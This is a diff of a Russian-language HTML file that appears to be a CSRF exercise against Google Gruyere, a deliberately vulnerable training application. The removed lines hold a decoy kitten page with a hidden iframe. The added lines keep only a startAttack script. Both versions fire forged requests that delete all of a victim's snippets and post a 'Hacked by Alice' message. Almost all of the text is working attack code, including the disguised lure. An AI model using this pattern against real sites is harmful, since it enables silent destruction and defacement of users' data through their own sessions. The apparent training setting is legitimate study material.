@@ -1,60 +1,18 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-  <meta charset="UTF-8">
-  <title>Котики 🐱</title>
-  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🐱</text></svg>">
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      margin: 50px;
-      background: #f9f9f9;
-    }
-    img {
-      border-radius: 12px;
-      box-shadow: 0 6px 12px rgba(0,0,0,0.15);
-      max-width: 600px;
-    }
-    .msg {
-      margin-top: 20px;
-      color: #555;
-      font-size: 18px;
-    }
-  </style>
-</head>
-<body>
-  <h1>Смотрите, какие котики!</h1>
-  <img src="https://i.imgur.com/8UXpQeA.jpg" alt="Милый котик">
-  <p class="msg">Какой милый котёнок, правда? 😊</p>
+<script>
+function startAttack() {
+  const base = 'https://google-gruyere.appspot.com/643453999600290416051506802884356354571';
+  const indices = [0, 1, 2, 3];
 
-  <!-- Скрытый iframe — загружает Gruyere для активации сессии -->
-  <iframe
-    src="https://google-gruyere.appspot.com/643453999600290416051506802884356354571"
-    onload="startAttack()"
-    style="display:none">
-  </iframe>
+  // Удаляем ВСЕ сниппеты
+  indices.forEach(index => {
+    const img = new Image();
+    img.src = base + '/deletesnippet?index=' + index + '&t=' + Date.now();
+  });
 
-  <script>
-    function startAttack() {
-      // Ждём 1 сек — чтобы сессия точно активировалась
-      setTimeout(() => {
-        const base = 'https://google-gruyere.appspot.com/643453999600290416051506802884356354571';
-        const indices = [0, 1, 2, 3]; // Индексы всех сниппетов
-
-        // Удаляем все сниппеты
-        indices.forEach(index => {
-          const img = new Image();
-          img.src = base + '/deletesnippet?index=' + index + '&t=' + Date.now();
-        });
-
-        // Через 1.5 сек — создаём свой
-        setTimeout(() => {
-          const create = new Image();
-          create.src = base + '/newsnippet?snippet=' + encodeURIComponent('Хакнуто Алисой 😈');
-        }, 1500);
-      }, 1000);
-    }
-  </script>
-</body>
-</html>
+  // Создаём свой
+  setTimeout(() => {
+    const create = new Image();
+    create.src = base + '/newsnippet?snippet=' + encodeURIComponent('🔥 ВСЁ УДАЛЕНО. Хакнуто Алисой 😈');
+  }, 1500);
+}
+</script>
